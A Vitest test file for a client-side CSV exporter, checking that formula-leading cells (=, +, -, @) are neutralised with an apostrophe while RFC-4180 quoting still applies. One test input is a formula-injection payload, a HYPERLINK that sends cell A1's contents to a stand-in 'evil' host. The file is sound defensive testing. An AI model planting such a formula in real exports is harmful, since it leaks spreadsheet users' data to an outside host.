/**
 * CSV-E01..E04 — the client-side CSV export neutralises formulas.
 *
 * The server-side exporter has used `csvSafe` since it was written; this
 * client-side path grew up separately with RFC-4180 quoting only, which does
 * not stop formula execution — a spreadsheet strips the quotes on import and
 * then evaluates a leading `=`. It exports contractor names and permit titles,
 * both free text.
 */
import { describe, expect, it } from 'vitest';
import { buildCsvForTests } from './download-csv';

describe('client CSV export (formula injection)', () => {
  it('CSV-E01: a leading = is neutralised', () => {
    const csv = buildCsvForTests(['Name'], [['=HYPERLINK("http://evil/"&A1,"Click")']]);
    expect(csv).not.toMatch(/(^|,|")=HYPERLINK/);
    expect(csv).toContain("'=HYPERLINK");
  });

  it('CSV-E02: the other three formula leaders are neutralised too', () => {
    const csv = buildCsvForTests(['A', 'B', 'C'], [['+1+1', '-1+1', '@SUM(A1)']]);
    for (const cell of ["'+1+1", "'-1+1", "'@SUM(A1)"]) {
      expect(csv).toContain(cell);
    }
  });

  it('CSV-E03: ordinary values are untouched and RFC quoting still applies', () => {
    const csv = buildCsvForTests(['Name', 'Note'], [['Acme Roofing Ltd', 'Comma, and a "quote"']]);
    expect(csv).toContain('Acme Roofing Ltd');
    // Quoted because of the comma, with the inner quotes doubled.
    expect(csv).toContain('"Comma, and a ""quote"""');
    // No stray apostrophe added to a benign cell.
    expect(csv).not.toContain("'Acme");
  });

  it('CSV-E04: a formula that also needs quoting gets both treatments', () => {
    const csv = buildCsvForTests(['A'], [['=1,2']]);
    expect(csv).toContain('"\'=1,2"');
  });
});
